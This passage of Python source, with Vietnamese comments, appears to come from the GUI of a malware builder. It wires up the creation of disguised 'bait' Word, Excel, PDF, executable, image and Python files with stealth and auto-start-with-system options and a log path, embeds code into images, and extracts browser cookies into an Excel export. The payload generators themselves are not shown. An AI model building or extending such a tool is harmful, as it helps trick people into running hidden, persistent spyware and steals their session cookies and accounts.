        """Xử lý tạo file mồi sau khi đã cài đặt các package cần thiết.
       
       Args:
           file_path: Đường dẫn file mồi
           log_path: Đường dẫn lưu log
           stealth_mode: Chế độ ẩn
           auto_start: Tự động khởi động cùng hệ thống
           bait_type: Loại file mồi
           callback_func: Hàm callback sau khi tạo xong
       """
        # Hiển thị cửa sổ tiến trình
        progress_window = tk.Toplevel(self.root)
        progress_window.title(f"Đang tạo file {os.path.basename(file_path)}")
        progress_window.geometry("300x100")
        progress_window.resizable(False, False)

        ttk.Label(progress_window, text=f"Đang tạo file mồi...").pack(pady=10)
        progress = ttk.Progressbar(progress_window, mode="indeterminate")
        progress.pack(fill=tk.X, padx=20)
        progress.start()

        # Tạo file mồi trong thread riêng
        def create_thread():
            try:
                # Tạo file mồi theo loại đã chọn
                if "Python" in bait_type:
                    BaitFileGenerator.create_python_bait(
                        file_path, log_path, stealth_mode, auto_start
                    )
                elif "Word" in bait_type:
                    BaitFileGenerator.create_word_bait(
                        file_path, log_path, stealth_mode, auto_start
                    )
                elif "Excel" in bait_type:
                    BaitFileGenerator.create_excel_bait(
                        file_path, log_path, stealth_mode, auto_start
                    )
                elif "PDF" in bait_type:
                    BaitFileGenerator.create_pdf_bait(
                        file_path, log_path, stealth_mode, auto_start
                    )
                elif "Thực thi" in bait_type:
                    BaitFileGenerator.create_exe_bait(
                        file_path, log_path, stealth_mode, auto_start
                    )
                elif "Hình ảnh" in bait_type:
                    # Cho phép người dùng chọn một ảnh làm cơ sở
                    source_image = filedialog.askopenfilename(
                        title="Chọn ảnh gốc",
                        filetypes=[
                            ("Image files", "*.jpg *.jpeg *.png"),
                            ("All files", "*.*"),
                        ],
                    )

                    if source_image:
                        BaitFileGenerator.create_image_bait(
                            file_path, source_image, log_path, stealth_mode, auto_start
                        )
                    else:
                        self.update_ui(
                            lambda: (
                                progress_window.destroy(),
                                callback_func(False, "Không có ảnh gốc được chọn") if callback_func else None
                            )
                        )
                        return

                # Cập nhật UI từ thread chính
                self.update_ui(
                    lambda: (
                        progress_window.destroy(),
                        callback_func(True, f"Đã tạo file mồi thành công: {file_path}") if callback_func else None,
                        self.status_var.set(f"Đã tạo file mồi tại: {file_path}")
                    )
                )

            except Exception as e:
                logger.error(f"Lỗi khi tạo file mồi: {e}")
                self.update_ui(
                    lambda: (
                        progress_window.destroy(),
                        callback_func(False, f"Không thể tạo file mồi: {e}") if callback_func else None
                    )
                )

        threading.Thread(target=create_thread, daemon=True).start()

    def embed_to_image(self, source_image: str, output_path: str, log_path: str, stealth_mode: bool,
                       auto_start: bool, callback_func: Optional[Callable] = None) -> None:
        """Nhúng mã vào ảnh.
       
       Args:
           source_image: Đường dẫn ảnh gốc
           output_path: Đường dẫn ảnh đầu ra
           log_path: Đường dẫn lưu log
           stealth_mode: Chế độ ẩn
           auto_start: Tự động khởi động cùng hệ thống
           callback_func: Hàm callback sau khi nhúng xong
       """
        # Hiển thị cửa sổ tiến trình
        progress_window = tk.Toplevel(self.root)
        progress_window.title("Đang nhúng mã vào ảnh")
        progress_window.geometry("300x100")
        progress_window.resizable(False, False)

        ttk.Label(progress_window, text="Đang nhúng mã vào ảnh...").pack(pady=10)
        progress = ttk.Progressbar(progress_window, mode="indeterminate")
        progress.pack(fill=tk.X, padx=20)
        progress.start()

        # Thực hiện trong thread riêng
        def embed_thread():
            try:
                # Nhúng mã vào ảnh
                BaitFileGenerator.embed_code_to_image(
                    source_image, output_path, log_path, stealth_mode, auto_start
                )

                # Cập nhật UI từ thread chính
                self.update_ui(
                    lambda: (
                        progress_window.destroy(),
                        callback_func(True, f"Đã nhúng mã vào ảnh thành công", output_path) if callback_func else None,
                        self.status_var.set(f"Đã nhúng mã vào ảnh: {output_path}")
                    )
                )

            except Exception as e:
                logger.error(f"Lỗi khi nhúng mã vào ảnh: {e}")
                self.update_ui(
                    lambda: (
                        progress_window.destroy(),
                        callback_func(False, f"Không thể nhúng mã vào ảnh: {e}") if callback_func else None
                    )
                )

        threading.Thread(target=embed_thread, daemon=True).start()

    def extract_cookies(self, output_dir: str, callback_func: Optional[Callable] = None) -> None:
        """Trích xuất cookie từ các trình duyệt.
       
       Args:
           output_dir: Thư mục lưu kết quả
           callback_func: Hàm callback sau khi trích xuất xong
       """
        # Khởi tạo trình trích xuất cookie
        extractor = BrowserCookieExtractor()

        # Trích xuất trong thread riêng
        def extract_thread():
            try:
                result = extractor.extract_and_export(output_dir)

                # Cập nhật UI từ thread chính
                self.update_ui(
                    lambda: (
                        callback_func(result) if callback_func else None,
                        self.status_var.set(result["message"])
                    )
                )
            except Exception as e:
                logger.error(f"Lỗi khi trích xuất cookie: {e}")

                error_result = {
                    "success": False,
                    "message": f"Lỗi khi trích xuất cookie: {e}",
                    "browsers": {},
                    "total_cookies": 0,
                    "unique_domains": set(),
                    "excel_path": ""
                }

                self.update_ui(
                    lambda: (
                        callback_func(error_result) if callback_func else None,
                        self.status_var.set(f"Lỗi khi trích xuất cookie: {e}")
                    )
                )

        threading.Thread(target=extract_thread, daemon=True).start()
